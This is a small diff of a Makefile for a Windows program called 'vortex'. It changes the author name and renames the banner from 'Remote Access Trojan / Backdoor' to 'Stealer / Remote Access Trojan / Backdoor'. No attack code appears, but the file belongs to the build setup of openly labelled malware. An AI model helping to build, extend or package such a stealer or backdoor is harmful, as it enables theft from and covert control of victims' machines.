@@ -1,5 +1,5 @@
 EXECBIN=vortex
-AUTHOR=RagnarObscuron
+AUTHOR=r0ttenbeef
 VERSION=3.5
 DEBUG_BUILD=$(EXECBIN)-$(VERSION)_debug.exe
 RELEASE_BUILD32=$(EXECBIN)-$(VERSION)_x86.exe
@@ -14,7 +14,7 @@ define ANNOUNCE_BODY
   ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
   ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓██▓▒░   ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░
-                 Vortex Remote Access Trojan / Backdoor
+                 Vortex Stealer / Remote Access Trojan / Backdoor
 Author: $(AUTHOR) -- Version $(VERSION)
 ---
 endef
